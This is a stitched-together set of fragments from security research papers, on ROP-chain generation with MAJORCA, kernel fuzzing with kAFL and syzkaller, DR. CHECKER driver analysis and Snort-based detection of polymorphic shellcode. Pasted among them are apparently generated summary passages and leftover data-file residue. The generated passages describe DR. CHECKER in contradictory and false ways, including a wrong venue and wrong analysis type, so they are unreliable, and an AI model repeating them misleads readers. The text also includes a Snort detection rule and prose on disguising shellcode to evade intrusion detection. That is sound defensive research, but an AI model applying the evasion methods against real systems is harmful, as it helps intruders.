on32-bit Malta Linux. MAJORCA successfully generates 112 ROP chains (OK) out of 529 \ufb01les. Test \ufb01les were acquired'\\n'reuse of any copyrighted component of this work in other work s.Abstract \u2014Nowadays, exploits often rely on a code-reuse ap- proach. Short pieces of code called gadgets are chained toge ther to execute some payload. Code-reuse attacks can exploit vul - nerabilities in the presence of operating system protectio n that prohibits data memory execution. The ROP chain constructio n task is the code generation for the virtual machine de\ufb01ned by an exploited executable. It is crucial to understand how power ful ROP attacks can be. Such knowledge can be used to improve software security. We implement MAJORCA that generates ROP and JOP payloads in an architecture agnostic manner and thoroughly consider restricted symbols such as null bytes t hat terminate data copying via strcpy. The paper covers the whol e code-reuse payloads construction pipeline: cataloging ga dgets, chaining them in DAG, scheduling, linearizing to the ready- to- run payload. MAJORCA automatically generates both ROP and JOP payloads for x86 and MIPS. MAJORCA constructs payloads respecting restricted symbols both in gadget addresses and data. We evaluate MAJORCA performance and accuracy with rop- benchmark and compare it with open-source compilers. We sho w that MAJORCA outperforms open-source tools. We propose a ROP chaining metric and use it to estimate the probabilities of successful ROP chaining for different operating systems with MAJORCA as well as other ROP compilers to show that ROP chaining is still feasible. This metric can estimate the ef\ufb01 ciency of OS defences.

MAJORCA architecture We implemented described techniques in MAJORCA (Multi Architecture JOP and ROP Chain Assembler) tool. It is alibrary written in Python that allows users to set up ROP chai ns via API calls. We support both Linux and Windows operating systems. It is a lightweight and simple implementation for special input language determining ROP chain. Moreover, these calls can be integrated into any Python script that use rs may utilize for exploit generation. MAJORCA supports x86 architecture (both 32 and 64-bit) and MIPS. Figure 6 presents MAJORCA architecture. The binary is inputted into ROPGadget that searches for gadgets. All found gadgets transfer to the classi\ufb01cation stage performe d by gadget classi\ufb01er implemented inside the binary analysis'\\n'the intermediate pass register. For performance consideration, we set a threshold to limit the number of return paths to no more than 10. In this way, we can avoid a lot of waste of storage space and time caused by repeatedly generating paths, thus can improve the ef\ufb01ciency of ROP chain generation. 2) GADGET SEARCH ALGORITHM OPTIMIZATION Searching for a large number of gadgets in binary \ufb01les and libc wastes a lot of time, and we take two approaches for per- formance optimization: (1) Use multiprocess to \ufb01nd gadgets; (2) Delete duplicate, complex instructions, and save only the simpli\ufb01ed instructions. The purpose is to complete the search process of gadgets in the shortest time. 3) FUNCTION TEMPLATING Since the calling function is more complicated, we sim- plify the use of the function and directly add the function through the form of func_call . For example, rop.read(0, elf.bss(0x80)) is actually equivalent to rop.call(\u00e2\u0102\u0178read\u2019, (0, elf.bss(0x80))) . The bene\ufb01ts of this approach are that reduc- ing the lines of the script, providing a portable user interface, and simplifying the usage for analysts. IV.

ROP is a type of exploit technique used in software vulnerability exploitation, where an attacker crafts a sequence of instructions from the function return addresses in the stack to achieve their desired goal, such as code execution or data manipulation.\n\nMAJORCA's primary function is to automate the process of generating ROP chains. It starts by scanning the target binary for ROP and JOP (Jump-Oriented Programming) gadgets. ROP gadgets are instructions that end with a return instruction, while JOP gadgets are instructions that end with a jump instruction. MAJORCA classifies these gadgets based on their semantic types, which can include register initialization, memory initialization, system calls, and function calls.\n\nAfter finding and classifying the gadgets, MAJORCA filters and sorts them based on their quality. The quality of a gadget is determined by various factors, such as the reliability of the gadget, the number of required arguments, and the presence of any security mitigations that may interfere with the gadget's functionality.\n\nMAJORCA then builds a graph of moves between registers to determine the best sequence of gadgets to use in constructing the ROP chain.

Code-reuse attacks exploit vulnerabilities by chaining together small pieces of code, called gadgets, to execute a payload.

The number of discovered paths is not a good indica- tor for the amount of coverage: With increasing running time, it becomes more dif\ufb01cult to discover new paths. Secondly, the number of executions per second is also bi- ased by slower and harder to reach paths and especially crashing inputs. The coverage reached over time can be seen in Figure 6. It is obvious from the \ufb01gure that kAFL found a signi\ufb01cant number of paths that are very hard to Figure 7: Raw execution performance comparison. reach for TriforceAFL. kAFL mostly stops \ufb01nding new paths around the 10-15 minute mark, because the target driver simply doesn\u2019t contain any more paths to be un- covered. Therefore, the coverage value in Table 1 (stated asPaths/Min ) is limited to the \ufb01rst 10 minutes of each 30-minute run. We also compare raw execution performance instead of overall fuzzing performance, which is biased because of the execution of different paths, the sampling process for the non-determinism-\ufb01lter, and various synchroniza- tion mechanisms. Especially on smaller inputs, these factors disproportionately affect the overall fuzzing per- formance. To avoid this, we compared the performance during the \ufb01rst havoc stage. Figure 7 shows the raw ex- ecution performance of kAFL compared to TriforceAFL during this havoc phase. kAFL provides up to 54 times better performance compared to TriforceAFL\u2019s QEMU CPU emulation. Slightly lower performance boosts are seen in single-process execution (48 times faster). syzkaller We did not perform a performance compari- son against syzkaller [10].

B\u00f6hme et al. [14] showed how to use the insight gained from modelling gray-box fuzzing as a walk on a Markov chain to increase the performance of gray-box fuzzing by up to an order of magnitude. 6.4 Coverage-Guided Kernel Fuzzers A project called syzkaller was released by Vyukov; it is the \ufb01rst publicly available gray-box coverage-guided kernel fuzzer [10]. Nossum and Casanovas demonstrate that most Linux \ufb01le system drivers are vulnerable to feedback-driven fuzzing by using an adapted version of AFL [34]. This modi\ufb01ed AFL version is based on glue code to the kernel consisting of a driver interface to USENIX Association 26th USENIX Security Symposium    179measure feedback during fuzzing \ufb01le system drivers of the kernel and expose this data to the user space. This fuzzer runs inside the targeted OS; a crash terminates the fuzzing session. In 2016, Hertz and Newsham released a modi\ufb01ed ver- sion of AFL called TriforceAFL [7]. Their work is based on a modi\ufb01cation of QEMU and utilizes the correspond- ing emulation backend to measure fuzzing progress by determining the current instruction pointer after a control \ufb02ow altering instruction has been executed. In theory, their fuzzer is able to fuzz any OS emulated in QEMU. In practice, the TriforceAFL fuzzer is limited to operating systems that are able to boot from read-only \ufb01le systems, which narrows down the candidates to classic UNIX-like operating systems such as Linux, FreeBSD, NetBSD, or OpenBSD. Therefore, TriforceAFL is currently not able to fuzz closed-source operating systems such as macOS or Windows. 7 Discussion Even though our approach is general, fast and mostly in- dependent of the underlying OS, there are some limita- tions we want to discuss in this section.

You either take a fuzzer like AFL or libFuzzer and make it call syscalls instead of functions of a userspace program. Or you pull the kernel code into userspace and fuzz it there. These methods work fine for subsystems that process structures because userspace fuzzers are primarily focused on byte array mutations. Examples: fuzzing file systems and Netlink. For coverage-guided fuzzing, you have to integrate coverage collection from the kernel into the fuzzing algorithm.    * Using syzkaller. It\\'s perfect for API-aware fuzzing. The fuzzer uses a special language, syzlang, to describe syscalls and their return values and arguments.    * Writing your fuzzer from scratch. This is a great way to learn how fuzzing works from the ground up. In addition, this approach enables you to fuzz subsystems with unusual interfaces.   ####  Syzkaller tips    * Don\\'t just use syzkaller on a standard kernel with a standard config - you won\\'t find anything. Many researchers fuzz the kernel, both manually and with syzkaller. In addition, there is syzbot, which has been fuzzing many standard kernel flavors in the cloud for years. Do something new instead: write new syscall descriptions or use a nonstandard kernel config.    * Syzkaller can be improved and extended. When I was fuzzing USB, I implemented an additional USB-specific module on top of syzkaller.    * Syzkaller can be used as a framework. For instance, you can only use the code that parses the kernel log. Syzkaller recognizes hundreds of different error report types, and you may use this component in your fuzzer. Or you can use the virtual machine management code instead of writing it yourself.   How do you know whether your fuzzer is working well? Of course, if it finds new bugs, everything is fine. But what if it doesn\\'t?\"\\n', 2.4985711574554443)\n\n Syzkaller is an automated kernel fuzzer, which is a tool designed to find bugs in the Linux kernel by feeding it random inputs and observing the system's reaction. The name Syzkaller comes from \"Syscall Fuzzer\" as it primarily focuses on testing the kernel's system call interface.\n\nIn the context of the provided information, Syzkaller was used to discover a vulnerability in the Linux kernel's AF_PACKET socket implementation. AF_PACKET sockets are a low-level network programming interface that allows direct access to raw network packets. Since they provide a high level of control over network traffic, they are widely used in various applications, including network monitoring, packet sniffing, and packet injection.\n\nThe vulnerability discovered by Syzkaller affects multiple popular Linux distributions, including Ubuntu and Android. In the case of Android, access to AF_PACKET sockets is restricted to some privileged components due to security concerns. However, the vulnerability still poses a risk, as it could potentially be exploited by malicious applications that manage to gain elevated privileges.\n\nThe vulnerability has already been addressed in updated Ubuntu kernels. For Android, the update is scheduled for July 2023. Users of these distributions are advised to apply the updates as soon as they become available to mitigate the risk of potential exploitation.\n\n\n Syzkaller is an open-source, fuzzing-as-a-service tool for the Linux kernel. It is designed to find bugs in the kernel by generating and executing random input to various kernel interfaces and subsystems. Syzkaller is stateful, meaning that it maintains the state of the system during the test run and uses that state to inform the generation of future inputs. This state can include things like open file descriptors, network connections, and process state.\n\nUnlike Syzkaller, Unicorefuzz is a different fuzzing framework that is also used for kernel testing. Unicorefuzz is stateless, which means that it does not maintain any state between test runs. Instead, it starts each test run from a clean state, and the input is generated anew for each run. This approach can make it easier to reproduce crashes, as all the necessary information is available at the start of each test run.\n\nOne important difference between Syzkaller and Unicorefuzz is how they handle crashes. In the case of Syzkaller, the input that caused a crash may not be immediately replayable, as the system state may have changed during the crash and subsequent cleanup. In contrast, Unicorefuzz guarantees that all crashes are 100% replayable, as it starts each test run from a clean state.\n\nAnother difference is how they handle input persistence. Syzkaller persists the input state to disk using the usual AFL folder structure, while Unicorefuzz does not persist any\n\n\nUTCHER, referred to in the first paper as A.

[120] proposed a new method for analyz- ing ransomware, which they referred to as the Deep Ran- somware Threat Hunting and Intelligence System (DRTHIS). The latter is based on using convolutional neural net- works, long short-term memory, and two deep learning approaches. The authors showed that DRTHIS can achieve an F-measure of 99.6% with a positive rate of 97.2%. They also revealed how DRTHIS can detect unseen ran- somware from a number of new ransomware families in a reasonable amount of time. By employing semi-supervised deep learning approaches, Sharmeen et al. [13] identified deviating patterns in new ransomware variants. Behavioral attributes of the samples are extracted and the proposed deep learning approach is integrated with supervised learn- ing to make the system robust. The model is also capa- ble of detecting zero-day variants. Usharani et al. [121] developed a ransomware classification method using a machine learning algorithm achieving 98.45% accuracy and a 0.01 false rate. The data, of crypto-ransomware type, was collected and analyzed dynamically. The authors performed comparisons to Linear Regression, Adaboost, and Naive Bayes.

Since the kernel is reentrant, accessing globals without syn- cronization can result in race conditions that could lead to time of check to time of use (TOCTOU) bugs.5 Implementation DR. CHECKER is built on top of LLVM 3.8 [30]. LLVM was chosen because of its \ufb02exibility in writing analy- ses, applicability to different architectures, and excellent community support. We used integer range analysis as implemented by Rodrigues et al. [42]. This analysis is used by our vulnerability detectors to verify certain prop- erties (e.g., checking for an invalid cast). We implemented D R. CHECKER as an LLVM mod- ule pass, which consumes: a bitcode \ufb01le, an entry function name , and an entry function type . It then runs our SDT analysis, employing the various anal- ysis engines and vulnerability detectors. Depending on theentry function type , certain arguments to the entry functions are tainted before invoking the SDT (See Section 5 .3). Because our analysis operates on LLVM bitcode, we must \ufb01rst identify and build all of the driver\u2019s bitcode \ufb01les for a given kernel ( Section 5 .1). Similarly, we must identify all of the entry points in these drivers (Section 5 .2) in order to pass them to our SDT analysis. 5.1 Identifying Vendor Drivers To analyze the drivers independently, we must \ufb01rst dif- ferentiate driver source code \ufb01les from that of the core kernel code. Unfortunately, there is no standard location in the various kernel source trees for driver code. Making the problem even harder, a number of the driver source \ufb01les omit vendor copyright information, and some ven-in the various kernel source trees for driver code. Making the problem even harder, a number of the driver source \ufb01les omit vendor copyright information, and some ven- dors even modify the existing sources directly to imple- ment their own functionality.

CHECKER : A Soundy Analysis for Linux Kernel Drivers Aravind Machiry, Chad Spensky, Jake Corina, Nick Stephens, Christopher Kruegel, and Giovanni Vigna {machiry, cspensky, jcorina, stephens, chris, vigna }@cs.ucsb.edu University of California, Santa Barbara Abstract While kernel drivers have long been know to poses huge security risks, due to their privileged access and lower code quality, bug-\ufb01nding tools for drivers are still greatly lacking both in quantity and effectiveness. This is be- cause the pointer-heavy code in these drivers present some of the hardest challenges to static analysis, and their tight coupling with the hardware make dynamic analysis infeasible in most cases. In this work, we present D R. CHECKER , asoundy (i.e., mostly sound) bug-\ufb01nding tool for Linux kernel drivers that is based on well-known program analysis techniques. We are able to overcome many of the inherent limitations of static anal- ysis by scoping our analysis to only the most bug-prone parts of the kernel (i.e., the drivers), and by only sac- ri\ufb01cing soundness in very few cases to ensure that our technique is both scalable and precise. D R. CHECKER is a fully-automated static analysis tool capable of perform- ing general bug \ufb01nding using both pointer and taint anal- yses that are \ufb02ow-sensitive, context-sensitive, and \ufb01eld- sensitive on kernel drivers. To demonstrate the scala- bility and ef\ufb01cacy of D R. CHECKER , we analyzed the'\\n'Checker Dupli Checker (http://www.duplichecker.com) is a freeware online plagiarism detectiontool, shown in Figure 9-16.Tool: PlagiarismDetect.com PlagiarismDetect.com is another freeware online plagiarism detection tool,shown in Figure 9-17.'\\n'results, without completely sacri\ufb01cing soundness. We have implemented D R. CHECKER in a modular way, which enables both analyses and bug detectors to be eas- ily adapted for real-world bug \ufb01nding. In fact, during the writing of this paper, we identi\ufb01ed a new class of bugs and were able to quickly augment D R. CHECKER to identify them, which resulted in the discovery 63 zero-day bugs. In total, D R. CHECKER discovered 158 previously undiscovered zero-day bugs in nine popular mobile Linux kernels. All of the details and disclo- sures for these bugs can be found online at github. com/ucsb-seclab/dr_checker . While these results are promising, D R. CHECKER still suffers from over- approximation as a result of being soundy , and we have identi\ufb01ed areas for future work. Nevertheless, we feel that D R. CHECKER exhibits the importance of analyzing Linux kernel drivers and provides a useful framework for adequately handling this complex code.

For example, warnings like, \u201c warning: Us- ing plain integer as NULL pointer \u201d and \u201c warning: sym- bol \u2019htc smem ram addr\u2019 was not declared. Should it be static? ,\u201d were extremely common. cppcheck Cppcheck was the most complicated to use of the tools that we evaluated, as it required manual iden- ti\ufb01cation of all of the includes, con\ufb01gurations, etc. in the source code. However, this knowledge of the source code structure did result in much more concise results. While the project is open-source, their analysis techniques are not well-documented. Nevertheless, it is clear that the tool can handle more complex interactions (e.g., macros, globals, and loops) than the other three. For example, in one of the raised warnings it reported an out-of-bounds index in an array lookup. Unfortunately, after manual investigation there was a guard condition protecting thearray access, but this was still a much more valuable warning that those returned by other tools. It was also able to identify an interesting use of snprintf on over- lapped objects, which exhibits unde\ufb01ned behavior, and appeared generally useful. It also has a con\ufb01gurable en- gine, which allows users to specify additional types of vulnerability patterns to identify. Despite this function- ality, it still failed to detect any of the complex bugs that DR. CHECKER was able to help us discover. To summarize our experience, we provide a side- by-side feature comparison of the evaluated tools and DR. CHECKER inTable 3 . Note that cppcheck and DR. CHECKER where the only two with an extensible framework that can be used to add vulnerability detec- tors. Similarly, every tool aside from Sparse, which needs manual annotations, was more-or-less completely automated. As previously mentioned, Sparse\u2019s annota- tions are used to \ufb01nd unsafe user pointer dereferences, and while these annotations are used rigorously in the'\\n'verify a vulnerable condition and produce a taint trace with all of their emitted warnings.

These staggering numbers were attributed to lower overall code quality in drivers and im- proper implementations of the complex interactions with the kernel core by the third party supplying the driver. In 2011, Palix et al. [39] analyzed the Linux kernel again and showed that while drivers still accounted for the greatest number of bugs, which is likely because drivers make up 57% of the total code, the fault rates for drivers where no longer the highest. Our recent analy- sis of main line linux kernel commit messages found that 28% of CVE patches to the linux repository in the past year involved kernel drivers (19% since 2005), which is in line with previous studies [17]. Meanwhile, the mo- bile domain has seen an explosion of new devices, and thus new drivers, introduced in recent years. The lack of attention being paid to these drivers, and their potential danger to the security of the devices, has also not gone unnoticed [47]. Recent studies even purport that mobile kernel drivers are, again, the source of up to 85% of the reported bugs in the Android [48] kernel. Yet, we are unaware of any large-scale analysis of these drivers. In this work, we present D R. C HECKER , a fully- automated static-analysis tool capable of identifying numerous classes of bugs in Linux kernel drivers. DR. CHECKER is implemented as a completely modu- lar framework, where both the types of analyses (e.g., points-to or taint) and the bug detectors (e.g., integer over\ufb02ow or memory corruption detection) can be eas- ily augmented. Our tool is based on well-known pro- gram analysis techniques and is capable of performing both pointer and taint analysis that is \ufb02ow-, context-, and \ufb01eld-sensitive. D R. CHECKER employs a soundy [31] approach, which means that our technique is mostly sound, aside from a few well-de\ufb01ned assumptions that violate soundness in order to achieve a higher precision. DR. C HECKER , is the \ufb01rst (self-proclaimed) soundy'\\n'which resulted in 21 false warnings. The same over- approximation of points-to affected InvalidCastDetector,pened for entry point scv4l2 scrop in Samsung, which resulted in 21 false warnings. The same over- approximation of points-to affected InvalidCastDetector, with 2 entry points ( picolcd debug flash read and picolcd debug flash write ) resulting in 66 (80%) false positives in Huawei and a single entry point (touchkey fwupdate.419 ) accounting for a major- ity of the false positives in Samsung. IntegerOver- \ufb02owDetector also suffered from over-approximation at times, with 30 false warnings in a single entry point hifi misc ioctl for Hauwei. One notable takeaway from our evaluation was that while we expected to \ufb01nd numerous integer over\ufb02ow bugs, we found them to be far more prevalent in 32 bit ar- chitectures than 64 bites, which is contrary to previously held beliefs [58]. Additionally, D R. CHECKER was able to correctly identify the critical class of Boomerang [33] bugs that were recently discovered. 7.2 Soundy Assumptions DR. CHECKER in total analyzed 1207 entry points and 90% of the entry points took less than 100 seconds to complete. D R. CHECKER \u2019s practicality and scalability are made possible by our soundy assumptions.

There are many notable quirks in this bug that make it prohibitively dif\ufb01cult for na \u00a8\u0131ve static analysis tech- niques. First, the bug arises from tainted-data (i.e., argp ) propagating through multiple usages into a dan- gerous function, which is only detectable by a \ufb02ow- sensitive analysis. Second, the integer over\ufb02ow oc- curs because of a speci\ufb01c \ufb01eld in the user-provided struct , not the entire buffer. Thus, any analysis that is not \ufb01eld sensitive would over-approximate this and incorrectly identify flow pas the culprit. Fi- nally, the memory corruption in a different function (i.e., adjust traffic flow bypkg), which means that that the analysis must be able to handle inter-procedural calls in a context-sensitive way to precisely report the origin of the tainted data. Thus, this bug is likely only possible to detect and report concisely with an analysis that is \ufb02ow-, context-, and \ufb01eld-sensitive. Moreover, the fact that this bug exists in the driver of a popular mobile device, shows that it evaded both expert analysts and possibly existing bug-\ufb01nding tools. 3 Analysis Design DR. CHECKER uses a modular interface for its analyses. This is done by performing a general analysis pass over the code, and invoking analysis clients at speci\ufb01c points throughout the analysis. These analysis clients all share'\\n'structures and \ufb01nd known vulnerable signatures. How- ever, their tool is similar to a pattern-matching model- checking type approach, whereas we are performing gen- eral taint and points-to analysis with pluggable vulner- ability detectors. VCCFinder [41] also used a simi- lar pattern-matching approach, but automatically con- structed their signatures by training on previously known vulnerabilities to create models that could be used to de- tect future bugs. MECA [63] is a static-analysis framework, capable of taint analysis, that will report violations based on user annotations in the source code, and similarly aims to re- duce false positives by sacri\ufb01cing soundness. ESP [22] isalso capable of fully path-sensitive partial analysis using \u201cproperty simulation,\u201d wherein they combine data-\ufb02ow analysis with a property graph. However, this approach is not as robust as our more general approach. Boyd-Wickizer et al. [15] proposed a potential defense against driver vulnerabilities that leverages x86 hardware features; however, these are unlikely to be easily ported to ARM-based mobile devices. Nooks [49] is a similar defense; however, this too has been neglected in both the mainline and mobile deployments thus far, due to similar hardware constraints. 10 Conclusion We have presented D R.

The tool's name is attributed to Dr. Checker, who is the person or entity behind the development and maintenance of this tool.\n\nDr. Checker is different from other static analysis tools in that it focuses solely on analyzing Linux kernel drivers, as opposed to the entire Linux kernel or other software systems. This reduction in analysis scope is intended to improve scalability and precision. However, Dr. Checker sacrifices soundness in a few cases, meaning that it may not detect all bugs or vulnerabilities, particularly when it encounters calls into core kernel code.\n\nDespite this trade-off, Dr. Checker is effective in detecting known classes of vulnerabilities in Linux kernel drivers. For instance, it can identify uninitialized data leaks, which are a common type of vulnerability.\n\nAnother tool, K-Miner, is also mentioned in the context. K-Miner is another static analysis tool, but it is not limited to analyzing Linux kernel drivers. Instead, it is a general-purpose kernel analysis tool that aims to improve practicality and efficiency by focusing on kernel data flow analysis. While both tools share the goal of improving practicality and effectiveness, they differ in their analysis scopes and approaches. Dr. Checker is more specialized in analyzing Linux kernel drivers, while K-Miner is a more general-purpose kernel analysis tool.\n\n\nDr. CHECKER is a static analysis tool for finding bugs in software code, specifically in the context of sound analysis with a few well-defined assumptions that violate soundness for the purpose of achieving higher precision. It is the first tool of its kind to claim the title of \"soundy,\" meaning that it adheres to the rules of logic and reasoning in the analysis process while still maintaining a high degree of accuracy.\n\nDr. CHECKER is also the first static analysis tool capable of large-scale analysis of general classes of bugs in driver code for mobile device kernels. Static analysis is a software testing technique that examines the source code of a program without executing it, relying on mathematical algorithms and logic to identify potential issues.\n\nThe tool was evaluated by analyzing nine popular mobile device kernels, totaling 3.1 million lines of code (LOC). During this evaluation, Dr. CHECKER correctly identified bugs in the code, demonstr\n\n\n CHECKER is a tool or a system described in the paper \"DR. CHECKER: A Sound Verification Framework for Linux Kernel Drivers\" by Machiry et al., published in the Proceedings of the 33rd Annual Computer Security Applications Conference (ACSAC) by the USENIX Association in 2022. The paper is available at the provided URL.\n\nThe authors of the paper present DR. CHECKER, a verification framework designed to analyze the correctness of Linux kernel drivers. The framework is based on Interproc, a model checker for Linux kernel drivers, and uses a combination of static and dynamic analysis techniques.\n\nThe tool, CHECKER, is the front-end of the framework that takes as input a Linux kernel driver and performs various analyses to detect potential bugs or vulnerabilities. The tool uses ownership reasoning, as described in the paper by Emamdoost in a related work, to track the ownership of kernel objects and ensure that they are properly released when no longer needed. This helps detect memory leaks and other resource management issues in the driver.\n\nIn summary, CHECKER is a tool or a component of the DR. CHECKER framework that analyzes Linux kernel drivers for correctness and potential bugs or vulnerabilities using a combination of static and dynamic analysis techniques and ownership reasoning.\n\n\nDR. Checker is a modular and extensible framework for performing dynamic analysis of software applications to detect various types of bugs and vulnerabilities. The framework is named DR. Checker, and it is designed to be flexible, allowing for the easy addition of new analysis types and bug detectors.\n\nAt its core, DR. Checker utilizes well-known program analysis techniques to perform both pointer and taint analysis. These analyses are flow-sensitive, context-sensitive, and field-sensitive, meaning that they take into account the control flow, the program context, and the data fields of the program, respectively.\n\nPointer analysis is used to determine the relationships between memory locations and the pointers that point to them. This analysis is crucial for understanding memory accesses and preventing memory-related bugs, such as use-after-free or buffer overflows.\n\nTaint analysis, on the other hand, is used to track the flow of\n\n\nDr. CHEcker is not a specific person but rather a name given to a family of static program analysis tools that are designed to detect bugs and vulnerabilities in C programs. These tools operate at the compilation level and are implemented as optimizations on top of popular open-source projects, such as LLVM.\n\nThe motivation behind the development of Dr. CHEcker and similar tools is to provide a more rigorous formal analysis of the properties of programs, especially in the context of security and safety-critical systems. Traditional testing methods, such as unit testing and integration testing, have limitations in detecting all possible bugs and vulnerabilities, especially those related to complex control flow and memory safety issues.\n\nTo address these limitations, Dr. CHEcker and similar tools use abstract representations of the program, such as the abstract syntax tree (AST) or the control flow graph (CFG), to perform static analysis. These abstract representations allow the tools to reason about the program'\n\n\n"}

Hence, in order to increase the  chances ofpointing to the exploit code, a string of NOPs are placed, as in local exploits.  2.2. Polymorphic shellcode  Polymorphic shellcode [7] is basically a functionally equivalent form of a buffer  overflow exploit with a different signature on the network. As it hits the target machine,  it reassembles, having eluded the IDS [SI.  A well-known tool that generates polymorphic shellcode is a polymorphic  buffer-overflow engine called ADMutate [9]. An attacker feeds the ADMutate a buffer  overflow exploit to generate hundreds or thousands of functionally equivalent exploits  [IO]. This is accomplished by using simple encryption techniques, along with the  substitution of functionally equivalent machine-language instructions. This confuses  many IDS tools (including Snort) that search for the familiar NOP sled or the known  machine-language exploit included in buffer overflows, as ADMutate dynamically  modifies these elements.  A buffer overflow attack script consists of three parts, a set of NOPs, the  shellcode, and the return address in the form [NNNN][SSSS][RRRR].

Hence, we intend to use this part of a buffer  overflow attack script in enabling an IDS to detect polymorphic shellcode.  3.  As we saw above, one solution to the problem of determining the return address to  exploit a buffer overflow vulnerability is, to pad the front of the shellcode with NOP  instructions. If the return address points anywhere within the NOPs, they will just get  executed till the exploit code is reached. Using this method, the exploit might work for a  certain range of values since the return address could point anywhere within the string of  NOPs.  Hence, for every buffer overflow vulnerability, the return address is overwritten  with a value, which can only lie within a certain range of values (the process\\' address  space). By determining the address range for a particular buffer overflow exploit and\\'\\n\\'morph, your attack so that it has a differentsignature.

(For more onbuffer over\ufb02ows, see Chapter 14, \u201cUnderstanding and Attempting Buffer Over\ufb02ows.\u201d) Tochange the attack so that it cannot be detected, you need to change the code so that itreplaces 0x90 (the NOP code) with functionally equivalent code.

The name AdMutate specifically refers to a variant of shellcode that uses obfuscation techniques to evade detection by security software.\n\nThe term \"AdMutate [32]\" likely refers to a specific version of this shellcode that is designed for 32-bit systems. The number following the name indicates the version or variant of the shellcode.\n\nAdMutate, like other shellcode encryptors such as CLET and JempisCodes, uses XOR-based encryption to obfuscate the code. XOR encryption is a simple encryption technique that involves XORing each byte of the plaintext with a key byte. This results in encrypted bytes that are different from the original bytes but can be easily decrypted using the same key.\n\nTo evade detection, these shellcodes use dynamic decryption. This means that the decryption key and the decryption algorithm are not static but change during the execution of the shellcode. This makes it difficult for security software to detect the shellcode based on its frequency distribution or other static features.\n\nThe authors of the paper you provided describe their approach as being resilient to obfuscation techniques used by shellcodes like AdMutate. They explain that their mechanism depends only on the opcodes, which are the machine language instructions, and not on the operands, which are the data used in the instructions.

Background  In this section. we briefly describe buffer overflows and polymorphic shellcode.  2.1. Buffer Overflow  On many C implementations, writing past the end of an array causes the execution stack  to get corrupted. The stack is used to dynamically allocate the local variables used in  functions, to pass parameters to functions, and to return values from functions as shown  in Figure 1. It also stores the retum addresses for function calls and this is what makes it  vulnerable.  A buffer overflow [4,5,6] is the result of stuffing more data into a buffer than it  can handle. The data that does not fit into the allocated buffer space ovenvrites the bytes  after the allocated buffer space in the stack, including the rem address. When the stored  return address on the stack gets replaced by some arbitrary value due to a buffer  Authorized licensed use limited to: University of Pisa.

In this paper, we propose a new  solution to accurately identify one particular type of polymorphic attacks, known as  polymorphic shellcode. Due to the space limitation, solutions for dealing with other  types ofpolymorphic attacks are discussed in [I].  In polymorphic shellcode attacks, the attacker can choose an unknown  encryption algorithm to encrypt the attack code and include the decryption code as part of  the attack packet. The trick here is to utilize an existing buffer-overflow exploit and to set  the \u201dretum\u201d memory address on the over-flowed stack, to the entrance point of the  decrytion code module. The attacker can transform every other bit in the packet payload  to avoid being detected by a signature-based NIDS, but a critical constraint exists on the  range of.the \u201creturn\u201d memory address that can be twisted.  Our solution, Buttercup, is simply to identify the ranges of the possible retum  memory addresses for existing huffer-overflow vulnerabilities, and if a packet contains  such addresses, a redyellow flag might be raised. For the evaluation of false positives,  we have modified SNORT [2,3], an open-source signature-based NIDS, and selected 19  exploits to test against 55 different TCPdump traffic files. For one of our range matching  algorithms, the false positive rate is as low as 0.01%, while the rates for other simpler  algorithms are all below 1.13%. Hence, with Buttercup, we can drop all worm packets  based on the known buffer-overflow vulnerabilities, while dropping only 0.01% of the  good packets in the Internet.\\'\\n\\'implemented in Snort, in order to flag alerts only for those packets that have payloads  whose length falls within a given range in addition to containing the particular return  address values. Using these three additional keywords, the number of false positives was  brought down considerably. An example of a Snort rule containing the \\'dsize\\',  \\'rangeoffset\\' and \\'rangedepth\\' keywords, in addition to the \\'range\\' keyword, is as  follows:  alert tcp $EXTERNALLNET any -> $HTrP_SERVERS any (msg:\"MSSQL2000 remote  UDP exploit\"; range:\"142ael00042bOcaa41\"; dsize:475-550; rangeoffset:97;  rangedepth20; )  The above rule is used for detecting attacks that exploit the MS SQL 2000 buffer  overflow vulnerability. We detect these attacks by looking for values lying between  42ae1000 and 42hOcaa4, only in packets whose size falls in the range 475-550. Also, we  look for these values starting from the 97\" character in the packet payload and only  within 20 characters from the starting point. As we can sec from this example, this  greatly reduces the amount of processing that the IDS needs to do since it looks for the  address values only in certain packets and only in certain portions of those packets  instead of searching all the packet payloads from start to finish.  However, due to the complex nature of the shellcodes, we could not get values  for the \\'dsize\\', \\'rangeoffset\\' and \\'rangedepth\\' keywords for all of the exploits. We hope  that through deeper evaluation, these values can he obtained for all the exploits.

Traditional security measures are insufficient to  counter sophisticated cyber attacks. Intrusion Detection Systems  (IDS) have emerged as crucial tools for monitoring network  traffic, detecting unauthorized access, data breaches, and  malicious activities. To address the complexity of network traffic  and enhance detection accuracy, machine learning techniques  have become increasingly essential.

Once trained, the script  uses the trained model to detect any intrusions that Snort may  have omitted. Finally, the script establishes a threshold for the  number of detected intrusions within a 60-second interval. If  the number of detected intrusions for a particular signature ID  exceeds this threshold, an alert is generated to inform the user  that an intrusion has been detected.    Fig. 1.  Dataflow diagram of the proposed script  This code is an example of intrusion detection in a  distributed firewall using machine learning algorithms and the  PyShark library. It begins a traffic capture on the primary  firewall and filters packets based on the IP addresses of each  secondary firewall. Snort, an open-source intrusion detection  application, is then used to detect intrusions in the packets that  have been filtered. Using the \"intrusion_detection_data.csv\"  dataset, the code trains a Random Forest classification model  prior to detecting intrusions. This dataset contains  characteristics of network packets, including protocol, source  and destination IP addresses, source and destination ports, and  labels indicating whether the packet is legitimate or an  intrusion attempt. The model is trained to classify messages  into normal or intrusion categories. A decision threshold is set  to detect intrusions based on the probability of classifying  packets as an intrusion attempt after the model has been  trained. In the provided code example, this threshold has been  set to 0.5. Next, the code filters packets on each secondary  firewall and uses Snort to detect intrusions in the packets that  have been filtered. It then verifies detected intrusions and adds them to a dictionary for future reference. If an intrusion is  detected for the first time, a dictionary entry is created with the  detection time and the number of detections. If the intrusion  has been detected in the past, this condition examines to see if\\'\\n\\'0utside.tcpdump-01  sampledata0 1 -dumi  tcpdins-00 tcpdwkl mon-98  tcpdwkltue-98  tcpdinswkl wed-99  tcpdinswk2mon-99 -  BC-range -  0.6664  0.7276  0.2203  0.3113  1.1237  1.0721  0.5210  0.4927  ~ -  IC-range.  fsize<>  0.0144  0.0245  0  0.0057  0.0077  0.0075  0.0106  0.0107 Snort vel  Grange  &size<>  .RO-RD -  0.0138  0.0249  0  0.0051  0.0093  0.0092  0.0099 0.0098 ons  BC-range-  dsize>  0.5293  0.5987  0.2203  0.2408  0.9642 0.9275  0.4083 0.3845 C-range-  lsize>-  0.2468  0.2833  0.0275  0.1039  0.3240  0.3229  0.1902  0.1710  Table 2: Percentage of alerts generated for various versions of Snort for a range value of  +-200.

